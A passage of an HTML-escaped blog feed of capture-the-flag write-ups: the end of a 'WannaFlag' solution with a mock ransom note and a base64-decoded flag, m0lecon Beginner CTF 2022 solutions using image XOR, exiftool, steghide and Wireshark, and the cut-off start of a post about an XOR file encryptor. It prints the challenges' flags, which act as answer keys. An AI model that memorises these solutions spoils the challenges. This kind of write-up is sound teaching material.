&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;     ( \_.=&amp;quot;_.=&amp;quot;     `--------`     &amp;quot;=._&amp;quot;=._&#x2F; )
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      &amp;gt; _.=&amp;quot;                            &amp;quot;=._ &amp;lt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;     (_&#x2F;                                    \_)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                       ______
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                    .-&amp;quot;      &amp;quot;-.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                   &#x2F;            \
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;       _          |              |          _
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      ( \         |,  .-.  .-.  ,|         &#x2F; )
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;       &amp;gt; &amp;quot;=._     | )(__&#x2F;  \__)( |     _.=&amp;quot; &amp;lt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      (_&#x2F;&amp;quot;=._&amp;quot;=._ |&#x2F;     &#x2F;\     \| _.=&amp;quot;_.=&amp;quot;\_)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;             &amp;quot;=._ (_     ^^     _)&amp;quot;_.=&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                 &amp;quot;=\__|IIIIII|__&#x2F;=&amp;quot;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;                _.=&amp;quot;| \IIIIII&#x2F; |&amp;quot;=._
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      _     _.=&amp;quot;_.=&amp;quot;\          &#x2F;&amp;quot;=._&amp;quot;=._     _
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;     ( \_.=&amp;quot;_.=&amp;quot;     `--------`     &amp;quot;=._&amp;quot;=._&#x2F; )
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;      &amp;gt; _.=&amp;quot;                            &amp;quot;=._ &amp;lt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;     (_&#x2F;                                    \_)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïë ‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ñà‚ïó
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ïö‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; ‚ïö‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïë ‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ñà‚ïó
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ïö‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; ‚ïö‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïë ‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ñà‚ïó
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;‚ïö‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; ‚ïö‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Also all of you John OSINTs on twitter need to leave us alone
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;In the output they asked to pay pay 500,000 Goerli to the wallet &lt;code&gt;0x08f5AF98610aE4B93cD0A856682E6319bF1be8a6&lt;&#x2F;code&gt;. I cannot dooo itt..So, i ignored it :).&lt;&#x2F;p&gt;
&lt;p&gt;When we scroll to the last we have &lt;code&gt;John OSINTs on twitter&lt;&#x2F;code&gt; and &lt;code&gt;#YourFlagsBelongToUs&lt;&#x2F;code&gt;.
I did a quick twitter search,&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_wannaflag-14.png&quot; alt=&quot;wannaflag&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Decoding from &lt;code&gt;base64&lt;&#x2F;code&gt; will give us flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; echo &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;d2N0Znt1aGhoX3doM3IzX2QxZF80bGxfMHVyX2ZsNGdzX2cwP30=&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -d
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wctf{uhhh_wh3r3_d1d_4ll_0ur_fl4gs_g0?&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : wctf{uhhh_wh3r3_d1d_4ll_0ur_fl4gs_g0?}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>m0lec0n Beginner CTF 2022</title>
        <published>2022-11-13T00:00:00+00:00</published>
        <updated>2022-11-13T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/m0leconbeginner/"/>
        <id>https://themj0ln1r.github.io/writeups/m0leconbeginner/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/m0leconbeginner/">&lt;p&gt;I played &lt;strong&gt;m0lecon CTF 2022&lt;&#x2F;strong&gt; with my CTF team &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;196057&quot;&gt;TEAM-ASGARD&lt;&#x2F;a&gt;. These are the few challenges those i solved.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto-unrecognizable&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto-unrecognizable&quot; aria-label=&quot;Anchor link for: crypto-unrecognizable&quot;&gt;Crypto - Unrecognizable&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;The challenge contains these two images.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;molecon22&#x2F;m0lecon_unrecognizable1.png&quot; alt=&quot;challenge&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;molecon22&#x2F;m0lecon_unrecognizable2.png&quot; alt=&quot;whoami&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Immediately i wrote this script to make &lt;code&gt;xor&lt;&#x2F;code&gt; of these two images.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;PIL &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Image&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;ImageChops
&lt;&#x2F;span&gt;&lt;span&gt;im1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;Image&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;challenge.png&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;im2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;Image&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;whoami.png&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;im3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;ImageChops&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(ImageChops&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;subtract&lt;&#x2F;span&gt;&lt;span&gt;(im2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;im1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;ImageChops&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;subtract&lt;&#x2F;span&gt;&lt;span&gt;(im1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;im2))
&lt;&#x2F;span&gt;&lt;span&gt;im3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;save&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;im3.png&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Which gives new image consist of the flag in it.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;molecon22&#x2F;m0lecon_unrecognizable3.png&quot; alt=&quot;flag&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag: ptm{y0u_r34lly_7r4c3d_m3}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;misc-f33linegcut3&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#misc-f33linegcut3&quot; aria-label=&quot;Anchor link for: misc-f33linegcut3&quot;&gt;Misc - f33linegCut3&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;The challenge contains this selfie.jpeg image.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;molecon22&#x2F;m0lecon_selfie.jpeg&quot; alt=&quot;feelingCut3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Used &lt;code&gt;exiftool&lt;&#x2F;code&gt; to read metadata. &lt;code&gt;exiftool selfie.jpeg&lt;&#x2F;code&gt; and found this comment in metadata.&lt;&#x2F;p&gt;
&lt;p&gt;Comment:010101000110100001100101010011010110100101100111011010000111010001111001010100000110000101110111&lt;&#x2F;p&gt;
&lt;p&gt;Then I followed this &lt;code&gt;Bin &amp;gt; Hex &amp;gt; Ascii&lt;&#x2F;code&gt; Using &lt;a href=&quot;https:&#x2F;&#x2F;gchq.github.io&#x2F;CyberChef&#x2F;&quot; target=_blank&gt;Cyberchef&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The result is of this is &lt;code&gt;TheMightyPaw&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Now I tried &lt;code&gt;steghide extract -sf selfie.jpeg&lt;&#x2F;code&gt; and it results a &lt;code&gt;mesage.zip&lt;&#x2F;code&gt; which is password protected.&lt;&#x2F;p&gt;
&lt;p&gt;Unzipped the &lt;code&gt;message.zip&lt;&#x2F;code&gt; using &lt;code&gt;TheMightyPaw&lt;&#x2F;code&gt; as the password. It gave us the flag.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : ptm{n33d_M0r3_c4TN1p_b0ss}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;misc-filerecover&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#misc-filerecover&quot; aria-label=&quot;Anchor link for: misc-filerecover&quot;&gt;Misc - FileRecover&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;In this challenge a &lt;code&gt;capture.pcap&lt;&#x2F;code&gt; is attached.&lt;&#x2F;p&gt;
&lt;p&gt;By analyzing it in wireshark. I found that in one packet large size of data has been transmitted. I exported the packet data as the Image. The image contains the flag we need.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;molecon22&#x2F;m0lecon_pcap&quot; alt=&quot;pcap&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : n37w0rk_ch4ll3n935_4r3_fun_2&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>SecureFiles</title>
        <published>2022-11-03T00:00:00+00:00</published>
        <updated>2022-11-03T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/projects/securefiles/"/>
        <id>https://themj0ln1r.github.io/projects/securefiles/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/projects/securefiles/">&lt;p&gt;Hello buddy,&lt;&#x2F;p&gt;
&lt;p&gt;Today Mj0ln1r is posting this file encryptor and decryptor named &quot;SecureFiles&quot;.
SecureFiles is a encryption and decryption tool to share important files over any media.
I wrote this script called &lt;code&gt;SecureFiles&lt;&#x2F;code&gt; in python. I learned about &lt;code&gt;XOR&lt;&#x2F;code&gt; encryption, basic encoding and decoding using python, file management, &lt;code&gt;magic numbers&lt;&#x2F;code&gt; and random seed values in python.&lt;&#x2F;p&gt;
&lt;p&gt;So, here&#x27;s a brief information about my simple SecureFiles tool.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;securefiles&quot;&gt;SecureFiles&lt;&#x2F;h1&gt;
&lt;p&gt;With this tool we can able to encrypt text files, images, video&#x27;s, audio&#x27;s and any other files. And the decryption option is also available to decrypt the files.
This tool should be installed in the both reciever&#x27;s and sender&#x27;s system.&lt;&#x2F;p&gt;
&lt;p&gt;Okay, Let me show some code..&lt;&#x2F;p&gt;
&lt;p&gt;Look at the &lt;code&gt;main()&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;File Encrypter and Decrypter Menu
